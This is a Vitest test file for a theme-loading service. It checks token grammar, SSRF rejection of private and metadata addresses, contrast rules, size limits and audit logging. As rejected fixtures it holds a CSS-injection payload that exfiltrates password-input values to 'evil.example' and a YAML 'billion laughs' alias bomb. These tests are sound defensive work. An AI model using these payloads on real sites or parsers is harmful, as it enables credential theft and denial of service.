import { describe, expect, it, vi, beforeEach } from 'vitest'
import {
  reloadThemes,
  reloadThemesWithFanout,
  getThemesHealthField,
  getCompiledThemes,
  __resetThemeStateForTests,
  isValidColorGrammar,
  contrastRatio,
  MAX_THEME_FILE_BYTES,
} from './service.js'
import { UnsafeForwardingUrlError } from '../../lib/safe-fetch.js'

const THEMES_DIR = '/data/themes'
const ACME_BRAND = 'acme-brand'
const NO_SUCH_FILE = 'no such file'
const PRIVATE_ADDRESS_REASON_LOGO = "asset 'logo': URL resolves to a private/reserved address"

type FileFixture = { content: string; size?: number }

function fixtureDeps(files: Record<string, FileFixture>) {
  const readdir = vi.fn(async () => Object.keys(files))
  const stat = vi.fn(async (filePath: string) => {
    const name = filePath.split('/').pop() as string
    const fixture = files[name]
    if (!fixture) throw new Error('ENOENT')
    return { size: fixture.size ?? Buffer.byteLength(fixture.content, 'utf-8') }
  })
  const readFileBounded = vi.fn(async (filePath: string, maxBytes: number) => {
    const name = filePath.split('/').pop() as string
    const fixture = files[name]
    if (!fixture) throw new Error('ENOENT')
    if (Buffer.byteLength(fixture.content, 'utf-8') > maxBytes) {
      throw new Error('file too large')
    }
    return fixture.content
  })
  return { readdir, stat, readFileBounded }
}

const silentLogger = { info: vi.fn(), warn: vi.fn(), error: vi.fn(), fatal: vi.fn() }

beforeEach(() => {
  __resetThemeStateForTests()
  silentLogger.info.mockClear()
  silentLogger.warn.mockClear()
  silentLogger.error.mockClear()
  silentLogger.fatal.mockClear()
})

describe('reloadThemes — AC-1 pickup on reload', () => {
  it('loads a valid theme file and compiles it into a [data-theme] CSS block', async () => {
    const deps = fixtureDeps({
      'acme-brand.json': {
        content: JSON.stringify({
          name: ACME_BRAND,
          tokens: { colorPrimary600: '#1e3a8a', radiusMd: '0.5rem' },
        }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result).toEqual({ loaded: ['acme-brand.json'], failed: [] })
    const compiled = getCompiledThemes()
    expect(compiled).toHaveLength(1)
    expect(compiled[0]?.name).toBe(ACME_BRAND)
    expect(compiled[0]?.css).toContain('[data-theme="acme-brand"]')
    expect(compiled[0]?.css).toContain('--color-primary-600: #1e3a8a;')
    expect(compiled[0]?.css).toContain('--radius-md: 0.5rem;')
  })

  it('reload with zero files in an existing directory succeeds with empty loaded/failed', async () => {
    const deps = fixtureDeps({})
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result).toEqual({ loaded: [], failed: [] })
  })
})

describe('reloadThemes — AC-2 absent/unreadable directory', () => {
  it('absent directory (ENOENT) is zero behavior change, not an error, no fatal log', async () => {
    const readdir = vi.fn(async () => {
      const error = new Error(NO_SUCH_FILE) as NodeJS.ErrnoException
      error.code = 'ENOENT'
      throw error
    })
    const result = await reloadThemes(THEMES_DIR, { readdir, logger: silentLogger })
    expect(result).toEqual({ loaded: [], failed: [] })
    expect(silentLogger.fatal).not.toHaveBeenCalled()
  })

  it('unset directory behaves the same as absent (undefined themesDir)', async () => {
    const result = await reloadThemes(undefined, { logger: silentLogger })
    expect(result).toEqual({ loaded: [], failed: [] })
    expect(silentLogger.fatal).not.toHaveBeenCalled()
  })

  it('present-but-unreadable directory logs fatal but still resolves successfully', async () => {
    const readdir = vi.fn(async () => {
      const error = new Error('permission denied') as NodeJS.ErrnoException
      error.code = 'EACCES'
      throw error
    })
    const result = await reloadThemes(THEMES_DIR, { readdir, logger: silentLogger })
    expect(result).toEqual({ loaded: [], failed: [] })
    expect(silentLogger.fatal).toHaveBeenCalledTimes(1)
  })

  it('absent vs unreadable produce different log output but the same successful result shape', async () => {
    const absentReaddir = vi.fn(async () => {
      const error = new Error(NO_SUCH_FILE) as NodeJS.ErrnoException
      error.code = 'ENOENT'
      throw error
    })
    const unreadableReaddir = vi.fn(async () => {
      const error = new Error('permission denied') as NodeJS.ErrnoException
      error.code = 'EACCES'
      throw error
    })
    const absentResult = await reloadThemes(THEMES_DIR, {
      readdir: absentReaddir,
      logger: silentLogger,
    })
    const absentFatalCalls = silentLogger.fatal.mock.calls.length
    silentLogger.fatal.mockClear()
    const unreadableResult = await reloadThemes(THEMES_DIR, {
      readdir: unreadableReaddir,
      logger: silentLogger,
    })
    expect(absentResult).toEqual(unreadableResult)
    expect(absentFatalCalls).toBe(0)
    expect(silentLogger.fatal.mock.calls).toHaveLength(1)
  })
})

describe('reloadThemes — AC-3 per-file validation isolation', () => {
  it('one malformed file (invalid YAML syntax) never blocks a valid sibling file', async () => {
    const deps = fixtureDeps({
      'good-theme.json': {
        content: JSON.stringify({ name: 'good-theme', tokens: { radiusMd: '4px' } }),
      },
      'broken.yaml': { content: 'name: test\ntokens: {a: 1, b: 2\n' },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.loaded).toEqual(['good-theme.json'])
    expect(result.failed).toEqual([{ file: 'broken.yaml', reason: 'not valid JSON/YAML' }])
  })

  it('valid syntax but missing required `name` field fails with a schema-specific reason', async () => {
    const deps = fixtureDeps({
      'almost-there.json': { content: JSON.stringify({ tokens: { radiusMd: '4px' } }) },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.failed).toEqual([
      { file: 'almost-there.json', reason: 'missing required field `name`' },
    ])
  })

  it('tokens of the wrong type (not an object) fails with a schema-specific reason', async () => {
    const deps = fixtureDeps({
      'bad-tokens.json': {
        content: JSON.stringify({ name: 'bad-tokens', tokens: 'not-an-object' }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.failed).toEqual([{ file: 'bad-tokens.json', reason: 'tokens must be an object' }])
  })

  it('duplicate theme name across two files: first-alphabetically-by-filename wins deterministically', async () => {
    const deps = fixtureDeps({
      'theme-a.json': { content: JSON.stringify({ name: 'acme', tokens: {} }) },
      'theme-b.json': { content: JSON.stringify({ name: 'acme', tokens: {} }) },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.loaded).toEqual(['theme-a.json'])
    expect(result.failed).toEqual([
      {
        file: 'theme-b.json',
        reason: "duplicate theme name 'acme' (already loaded from theme-a.json)",
      },
    ])
  })

  it('zero valid files, all fail: still a successful (200-equivalent) reload result', async () => {
    const deps = fixtureDeps({
      'a.json': { content: 'not json at all {{{' },
      'b.json': { content: 'also not json [[[' },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.loaded).toEqual([])
    expect(result.failed).toHaveLength(2)
  })
})

describe('reloadThemes — AC-4 canonical token registry / CSS-injection safety', () => {
  it.each([
    ['rgb(30, 58, 138)', true],
    ['rgba(30, 58, 138, 0.5)', true],
    ['hsl(220, 64%, 33%)', true],
    ['hsla(220, 64%, 33%, 0.75)', true],
    ['rgb(30, 58)', false],
    ['hsl(220, 64, 33%)', false],
    ['rgba(30, 58, 138, 1.0)', false],
    ['rgb(30, 58, 138, url(evil))', false],
  ])('applies the bounded functional color grammar to %s', (value, expected) => {
    expect(isValidColorGrammar(value)).toBe(expected)
  })

  it('happy path: color/length/enum tokens all compile cleanly', async () => {
    const deps = fixtureDeps({
      'acme.json': {
        content: JSON.stringify({
          name: 'acme',
          tokens: {
            colorPrimary600: '#1e3a8a',
            radiusMd: '0.5rem',
            fontWeightBody: 'medium',
          },
        }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.loaded).toEqual(['acme.json'])
    const css = getCompiledThemes()[0]?.css ?? ''
    expect(css).toContain('--color-primary-600: #1e3a8a;')
    expect(css).toContain('--radius-md: 0.5rem;')
    expect(css).toContain('--font-weight-body: medium;')
  })

  it('accepts the bounded rgb/rgba/hsl/hsla color grammar', async () => {
    const deps = fixtureDeps({
      'color-functions.json': {
        content: JSON.stringify({
          name: 'color-functions',
          tokens: {
            colorPrimary600: 'rgb(30, 58, 138)',
            colorPrimary700: 'rgba(30, 58, 138, 1)',
            colorBackground: 'hsl(220, 64%, 33%)',
            colorForeground: 'hsla(220, 64%, 33%, 0.75)',
          },
        }),
      },
    })

    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })

    expect(result).toEqual({ loaded: ['color-functions.json'], failed: [] })
  })

  it('rejects a CSS-injection breakout attempt via a color token (url(/;/} breakout)', async () => {
    const payload =
      'red; } input[type=password][value^="a"] { background: url(https://evil.example/exfil?a)'
    const deps = fixtureDeps({
      'evil.json': {
        content: JSON.stringify({ name: 'evil', tokens: { colorPrimary600: payload } }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.loaded).toEqual([])
    expect(result.failed).toEqual([
      { file: 'evil.json', reason: 'token `colorPrimary600`: invalid color value' },
    ])
    expect(getCompiledThemes()).toEqual([])
  })

  it('rejects an unregistered token key — whole file fails, not a partial per-key load', async () => {
    const deps = fixtureDeps({
      'evil2.json': {
        content: JSON.stringify({
          name: 'evil2',
          tokens: { colorPrimary600: '#1e3a8a', someRandomKey: 'anything' },
        }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.loaded).toEqual([])
    expect(result.failed).toEqual([
      { file: 'evil2.json', reason: 'unregistered token `someRandomKey`' },
    ])
  })

  it('rejects a length token using calc() — expression-evaluation surface, not numeric+unit', async () => {
    const deps = fixtureDeps({
      'calc.json': {
        content: JSON.stringify({ name: 'calc-theme', tokens: { radiusMd: 'calc(1px + 1px)' } }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.failed).toEqual([
      { file: 'calc.json', reason: 'token `radiusMd`: invalid length value' },
    ])
  })

  it('rejects a length token with a disallowed/custom unit', async () => {
    const deps = fixtureDeps({
      'badunit.json': {
        content: JSON.stringify({ name: 'badunit', tokens: { radiusMd: '0.5vw-hack' } }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.failed).toEqual([
      { file: 'badunit.json', reason: 'token `radiusMd`: invalid length value' },
    ])
  })

  it('rejects an enum token with an undeclared value — closed set, never free text', async () => {
    const deps = fixtureDeps({
      'enum.json': {
        content: JSON.stringify({ name: 'enum-theme', tokens: { fontWeightBody: 'ultrablack' } }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.failed).toEqual([
      { file: 'enum.json', reason: 'token `fontWeightBody`: invalid value' },
    ])
  })
})

describe('reloadThemes — AC-5 asset URL SSRF validation', () => {
  it('happy path: public HTTPS asset URL passes through unchanged', async () => {
    const deps = fixtureDeps({
      'acme.json': {
        content: JSON.stringify({
          name: 'acme',
          tokens: {},
          assets: { logo: 'https://cdn.acme.example/logo.svg' },
        }),
      },
    })
    const dnsLookup = vi.fn(async () => [{ address: '93.184.216.34' }])
    const result = await reloadThemes(THEMES_DIR, { ...deps, dnsLookup, logger: silentLogger })
    expect(result.loaded).toEqual(['acme.json'])
    expect(getCompiledThemes()[0]?.css).toContain('https://cdn.acme.example/logo.svg')
  })

  it('rejects a CSS-breakout payload smuggled in an otherwise-public HTTPS asset URL (AC-4/AC-5 crossover)', async () => {
    // Found via adversarial code review: the SSRF check only validates the *hostname*, so a
    // syntactically valid public URL can still carry a `") } input[type=password]{...}` payload
    // that would break out of the compiled `url("...")` declaration if interpolated raw.
    const breakout =
      'https://cdn.breakout.example/logo.svg") } input[type=password]{background:url("https://evil.example/exfil'
    const deps = fixtureDeps({
      'acme.json': {
        content: JSON.stringify({ name: 'acme', tokens: {}, assets: { logo: breakout } }),
      },
    })
    const dnsLookup = vi.fn(async () => [{ address: '203.0.113.10' }])
    const result = await reloadThemes(THEMES_DIR, { ...deps, dnsLookup, logger: silentLogger })
    expect(result.loaded).toEqual([])
    expect(result.failed).toEqual([
      { file: 'acme.json', reason: "asset 'logo': URL contains unsafe characters" },
    ])
    // The DNS lookup must never even be reached — the character-safety check rejects the value
    // before any SSRF resolution is attempted.
    expect(dnsLookup).not.toHaveBeenCalled()
    expect(getCompiledThemes()).toEqual([])
  })

  it('rejects an RFC 1918 private-address asset URL', async () => {
    const deps = fixtureDeps({
      'acme.json': {
        content: JSON.stringify({
          name: 'acme',
          tokens: {},
          assets: { logo: 'https://internal.example/logo.png' },
        }),
      },
    })
    const dnsLookup = vi.fn(async () => [{ address: '192.168.1.50' }])
    const result = await reloadThemes(THEMES_DIR, { ...deps, dnsLookup, logger: silentLogger })
    expect(result.failed).toEqual([{ file: 'acme.json', reason: PRIVATE_ADDRESS_REASON_LOGO }])
  })

  it('rejects a cloud-metadata link-local asset URL', async () => {
    const deps = fixtureDeps({
      'acme.json': {
        content: JSON.stringify({
          name: 'acme',
          tokens: {},
          assets: { favicon: 'https://metadata.example/latest/meta-data/' },
        }),
      },
    })
    const dnsLookup = vi.fn(async () => [{ address: '169.254.169.254' }])
    const result = await reloadThemes(THEMES_DIR, { ...deps, dnsLookup, logger: silentLogger })
    expect(result.failed).toEqual([
      {
        file: 'acme.json',
        reason: "asset 'favicon': URL resolves to a private/reserved address",
      },
    ])
  })

  it('rejects a DNS name resolving to a private address', async () => {
    const deps = fixtureDeps({
      'acme.json': {
        content: JSON.stringify({
          name: 'acme',
          tokens: {},
          assets: { logo: 'https://internal.corp.example/logo.png' },
        }),
      },
    })
    const dnsLookup = vi.fn(async () => [{ address: '10.0.0.5' }])
    const result = await reloadThemes(THEMES_DIR, { ...deps, dnsLookup, logger: silentLogger })
    expect(result.failed).toEqual([{ file: 'acme.json', reason: PRIVATE_ADDRESS_REASON_LOGO }])
  })

  it('rejects a non-HTTPS asset URL (HTTPS-only decision, pinned)', async () => {
    const deps = fixtureDeps({
      'acme.json': {
        content: JSON.stringify({
          name: 'acme',
          tokens: {},
          assets: { logo: 'http://plain-http.example/logo.png' },
        }),
      },
    })
    const dnsLookup = vi.fn(async () => [{ address: '93.184.216.34' }])
    const result = await reloadThemes(THEMES_DIR, { ...deps, dnsLookup, logger: silentLogger })
    expect(result.failed).toEqual([
      { file: 'acme.json', reason: "asset 'logo': must use https://" },
    ])
  })

  it('propagates an UnsafeForwardingUrlError from the real resolver into the same rejection reason', async () => {
    const deps = fixtureDeps({
      'acme.json': {
        content: JSON.stringify({
          name: 'acme',
          tokens: {},
          assets: { logo: 'https://internal.example/logo.png' },
        }),
      },
    })
    const dnsLookup = vi.fn(async () => {
      throw new UnsafeForwardingUrlError('resolved to private address')
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, dnsLookup, logger: silentLogger })
    expect(result.failed).toEqual([{ file: 'acme.json', reason: PRIVATE_ADDRESS_REASON_LOGO }])
  })
})

describe('reloadThemes — AC-6 validation failure falls back to base theme', () => {
  it('a theme that fails validation is never present in the compiled-themes list', async () => {
    const deps = fixtureDeps({
      'acme-brand.json': {
        content: JSON.stringify({
          name: ACME_BRAND,
          tokens: { colorPrimary600: 'red; } evil {' },
        }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.failed).toHaveLength(1)
    expect(getCompiledThemes().find((t) => t.name === ACME_BRAND)).toBeUndefined()
  })

  it('a previously-loaded theme is dropped from the compiled list after a reload that fails it', async () => {
    const goodDeps = fixtureDeps({
      'acme-brand.json': {
        content: JSON.stringify({ name: ACME_BRAND, tokens: { radiusMd: '4px' } }),
      },
    })
    await reloadThemes(THEMES_DIR, { ...goodDeps, logger: silentLogger })
    expect(getCompiledThemes()).toHaveLength(1)

    const badDeps = fixtureDeps({
      'acme-brand.json': {
        content: JSON.stringify({ name: ACME_BRAND, tokens: { colorPrimary600: 'url(x)' } }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...badDeps, logger: silentLogger })
    expect(result.failed).toHaveLength(1)
    expect(getCompiledThemes()).toEqual([])
  })
})

describe('contrastRatio() — Story 30.4 AC1 direct unit coverage', () => {
  it('AC1 (Story 30.4): black-on-white contrast ratio is exactly 21', () => {
    expect(contrastRatio('#000000', '#ffffff')).toBe(21)
  })

  it('AC1 (Story 30.4): white-on-white contrast ratio is exactly 1', () => {
    expect(contrastRatio('#ffffff', '#ffffff')).toBe(1)
  })

  it('AC1 (Story 30.4): argument order does not change the ratio (symmetric formula)', () => {
    expect(contrastRatio('#7c3aed', '#ffffff')).toBe(contrastRatio('#ffffff', '#7c3aed'))
  })

  it.each([
    ['#abc', '#aabbcc'],
    ['#abcd', '#aabbccdd'],
  ])(
    'AC1 (Story 30.4): 3/4-digit hex shorthand %s normalizes the same as its 6/8-digit expansion %s',
    (short, long) => {
      expect(contrastRatio(short, '#ffffff')).toBeCloseTo(contrastRatio(long, '#ffffff'), 10)
    }
  )

  it.each([['rgb(999, 999, 999)'], ['hsl(999, 999%, 999%)']])(
    'AC1 (Story 30.4): out-of-grammar-range-but-shape-valid boundary values do not produce NaN/Infinity (%s)',
    (value) => {
      const ratio = contrastRatio(value, '#ffffff')
      expect(Number.isFinite(ratio)).toBe(true)
      expect(Number.isNaN(ratio)).toBe(false)
    }
  )

  it('AC1 (Story 30.4): a 5-digit hex (out of {3,4,6,8} enumeration) is contrast-indeterminate, never throws', () => {
    expect(() => contrastRatio('#1e3a8', '#ffffff')).not.toThrow()
    expect(Number.isFinite(contrastRatio('#1e3a8', '#ffffff'))).toBe(true)
  })

  it('AC1 (Story 30.4): a 7-digit hex (out of {3,4,6,8} enumeration) is contrast-indeterminate, never throws', () => {
    expect(() => contrastRatio('#1e3a8ab', '#ffffff')).not.toThrow()
    expect(Number.isFinite(contrastRatio('#1e3a8ab', '#ffffff'))).toBe(true)
  })
})

describe('reloadThemes — Story 30.4 AC2/AC3 contrast + opacity validation', () => {
  it('AC2 (Story 30.4): happy path — the shipped app.css base defaults pass the contrast bar', async () => {
    const deps = fixtureDeps({
      'acme.json': {
        content: JSON.stringify({
          name: 'acme',
          tokens: { colorPrimary600: '#7c3aed', colorPrimary700: '#6d28d9' },
        }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result).toEqual({ loaded: ['acme.json'], failed: [] })
  })

  it('AC2 (Story 30.4): rejects a low-contrast colorPrimary600 value (grammar-valid, contrast-invalid)', async () => {
    const deps = fixtureDeps({
      'acme.json': {
        content: JSON.stringify({
          name: 'acme',
          tokens: { colorPrimary600: '#f5f3ff' },
        }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.failed).toEqual([
      {
        file: 'acme.json',
        reason:
          'token `colorPrimary600`: insufficient contrast against white button text (needs >= 4.5:1)',
      },
    ])
  })

  it('AC2 (Story 30.4): a 5-digit hex colorPrimary600 is rejected as contrast-indeterminate, not silently accepted', async () => {
    const deps = fixtureDeps({
      'acme.json': {
        content: JSON.stringify({
          name: 'acme',
          tokens: { colorPrimary600: '#1e3a8' },
        }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.failed).toEqual([
      {
        file: 'acme.json',
        reason:
          'token `colorPrimary600`: insufficient contrast against white button text (needs >= 4.5:1)',
      },
    ])
    expect(getCompiledThemes()).toEqual([])
  })

  it('AC3 (Story 30.4): a fully-opaque rgba alpha of exactly "1" passes through to the contrast check normally', async () => {
    const deps = fixtureDeps({
      'acme.json': {
        content: JSON.stringify({
          name: 'acme',
          tokens: { colorPrimary700: 'rgba(30, 58, 138, 1)' },
        }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result).toEqual({ loaded: ['acme.json'], failed: [] })
  })

  it.each([
    ['colorPrimary600', 'rgba(30, 58, 138, 0.5)'],
    ['colorPrimary700', 'hsla(210, 50%, 30%, 0.75)'],
    ['colorPrimary600', '#7c3aedcc'],
    ['colorPrimary700', '#fff8'],
  ])(
    'AC3 (Story 30.4): rejects a translucent %s value (%s) — contrast is not computable against an unknown backdrop',
    async (key, value) => {
      const deps = fixtureDeps({
        'acme.json': {
          content: JSON.stringify({ name: 'acme', tokens: { [key]: value } }),
        },
      })
      const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
      expect(result.failed).toEqual([
        {
          file: 'acme.json',
          reason: `token \`${key}\`: must be fully opaque to validate button-text contrast`,
        },
      ])
    }
  )

  it('AC2.5 (Story 30.4): colorBackground/colorForeground/colorBorder remain grammar-checked only, no contrast gate', async () => {
    const deps = fixtureDeps({
      'acme.json': {
        content: JSON.stringify({
          name: 'acme',
          tokens: {
            colorBackground: 'rgba(255, 255, 255, 0.1)',
            colorForeground: '#ffffff',
            colorBorder: '#ffffff',
          },
        }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result).toEqual({ loaded: ['acme.json'], failed: [] })
  })
})

describe('reloadThemes — AC-10 resource exhaustion protections', () => {
  it('happy path: a normal small theme file parses and compiles with no limits triggered', async () => {
    const deps = fixtureDeps({
      'acme-brand.json': {
        content: JSON.stringify({ name: ACME_BRAND, tokens: { radiusMd: '4px' } }),
      },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.loaded).toEqual(['acme-brand.json'])
  })

  it('rejects a YAML alias-expansion ("billion laughs") bomb without hanging or spiking memory', async () => {
    const aliasBomb = [
      'a: &a [1,1,1,1,1,1,1,1,1,1]',
      'b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]',
      'c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]',
      'd: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c,*c]',
      'e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d,*d]',
      'f: [*e,*e,*e,*e,*e,*e,*e,*e,*e,*e]',
    ].join('\n')
    const deps = fixtureDeps({ 'bomb.yaml': { content: aliasBomb } })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.loaded).toEqual([])
    expect(result.failed).toEqual([
      { file: 'bomb.yaml', reason: 'YAML alias expansion exceeds safe limit' },
    ])
  })

  it('rejects a file exceeding the maximum size cap via fs.stat() before reading contents', async () => {
    const deps = fixtureDeps({
      'huge.json': { content: '{}', size: MAX_THEME_FILE_BYTES + 1 },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.failed).toEqual([
      { file: 'huge.json', reason: 'file exceeds maximum size (256KB)' },
    ])
    expect(deps.readFileBounded).not.toHaveBeenCalled()
  })

  it('bounds the actual bytes read independent of stat() (TOCTOU: file grows after stat)', async () => {
    const readdir = vi.fn(async () => ['grows.json'])
    const stat = vi.fn(async () => ({ size: 10 }))
    const readFileBounded = vi.fn(async () => {
      throw new Error('file too large')
    })
    const result = await reloadThemes(THEMES_DIR, {
      readdir,
      stat,
      readFileBounded,
      logger: silentLogger,
    })
    expect(result.failed).toEqual([
      { file: 'grows.json', reason: 'file exceeds maximum size (256KB)' },
    ])
  })

  it('silently skips non-theme-extension files without reporting them as failed', async () => {
    const deps = fixtureDeps({
      'good-theme.json': {
        content: JSON.stringify({ name: 'good-theme', tokens: { radiusMd: '4px' } }),
      },
      'second-theme.yaml': { content: 'name: second-theme\ntokens:\n  radiusMd: 8px\n' },
      'README.md': { content: '# not a theme' },
      '.DS_Store': { content: 'binary junk' },
    })
    const result = await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(result.loaded.sort()).toEqual(['good-theme.json', 'second-theme.yaml'])
    expect(result.failed).toEqual([])
  })
})

describe('getThemesHealthField — AC-9', () => {
  it('reports zero/zero before any reload has run', () => {
    expect(getThemesHealthField()).toEqual({ themesLoaded: 0, themesFailed: 0 })
  })

  it('reports the counts from the most recent reload', async () => {
    const deps = fixtureDeps({
      'good.json': { content: JSON.stringify({ name: 'good', tokens: {} }) },
      'bad.json': { content: 'not json {{{' },
    })
    await reloadThemes(THEMES_DIR, { ...deps, logger: silentLogger })
    expect(getThemesHealthField()).toEqual({ themesLoaded: 1, themesFailed: 1 })
  })
})

describe('reloadThemesWithFanout — AC-7 startup audit fanout', () => {
  it('writes one THEME_RELOADED audit row per existing org and logs a summary', async () => {
    const deps = fixtureDeps({
      'good.json': { content: JSON.stringify({ name: 'good', tokens: {} }) },
    })
    const listOrgIds = vi.fn(async () => ['org-1', 'org-2'])
    const auditWriter = vi.fn(async () => undefined)
    const result = await reloadThemesWithFanout(THEMES_DIR, {
      ...deps,
      listOrgIds,
      auditWriter,
      logger: silentLogger,
    })
    expect(result.loaded).toEqual(['good.json'])
    expect(auditWriter).toHaveBeenCalledTimes(2)
    expect(auditWriter).toHaveBeenCalledWith(
      'org-1',
      'theme.reloaded',
      expect.objectContaining({ loadedCount: 1, failedCount: 0, failedFiles: [] })
    )
  })

  it('never crashes boot: a per-org audit write failure is logged and does not throw', async () => {
    const deps = fixtureDeps({})
    const listOrgIds = vi.fn(async () => ['org-1'])
    const auditWriter = vi.fn(async () => {
      throw new Error('db unavailable')
    })
    await expect(
      reloadThemesWithFanout(THEMES_DIR, {
        ...deps,
        listOrgIds,
        auditWriter,
        logger: silentLogger,
      })
    ).resolves.toEqual({ loaded: [], failed: [] })
    expect(silentLogger.fatal).toHaveBeenCalled()
  })

  it('skips the audit fanout entirely when the themes directory does not exist (mirrors loadExtension() not_configured skip)', async () => {
    const readdir = vi.fn(async () => {
      const error = new Error(NO_SUCH_FILE) as NodeJS.ErrnoException
      error.code = 'ENOENT'
      throw error
    })
    const listOrgIds = vi.fn(async () => ['org-1'])
    const auditWriter = vi.fn(async () => undefined)
    const result = await reloadThemesWithFanout(THEMES_DIR, {
      readdir,
      listOrgIds,
      auditWriter,
      logger: silentLogger,
    })
    expect(result).toEqual({ loaded: [], failed: [] })
    expect(listOrgIds).not.toHaveBeenCalled()
    expect(auditWriter).not.toHaveBeenCalled()
  })

  it('skips the audit fanout when themesDir itself is not configured', async () => {
    const listOrgIds = vi.fn(async () => ['org-1'])
    const auditWriter = vi.fn(async () => undefined)
    const result = await reloadThemesWithFanout(undefined, {
      listOrgIds,
      auditWriter,
      logger: silentLogger,
    })
    expect(result).toEqual({ loaded: [], failed: [] })
    expect(auditWriter).not.toHaveBeenCalled()
  })

  it('never crashes boot: org enumeration failure is logged and does not throw', async () => {
    const deps = fixtureDeps({})
    const listOrgIds = vi.fn(async () => {
      throw new Error('db down')
    })
    await expect(
      reloadThemesWithFanout(THEMES_DIR, { ...deps, listOrgIds, logger: silentLogger })
    ).resolves.toEqual({ loaded: [], failed: [] })
    expect(silentLogger.fatal).toHaveBeenCalled()
  })
})
